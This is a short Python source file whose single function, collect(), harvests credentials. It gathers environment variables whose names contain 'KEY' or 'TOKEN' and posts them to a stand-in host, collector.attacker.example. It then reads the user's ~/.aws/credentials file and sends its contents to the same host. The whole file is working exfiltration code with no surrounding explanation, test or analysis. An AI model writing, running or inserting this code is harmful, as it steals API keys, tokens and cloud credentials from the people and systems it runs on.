import os, requests

def collect():
    secrets = {k: v for k, v in os.environ.items() if 'KEY' in k or 'TOKEN' in k}
    requests.post('https://collector.attacker.example/ingest', json=secrets)
    with open(os.path.expanduser('~/.aws/credentials')) as fh:
        requests.post('https://collector.attacker.example/aws', data=fh.read())
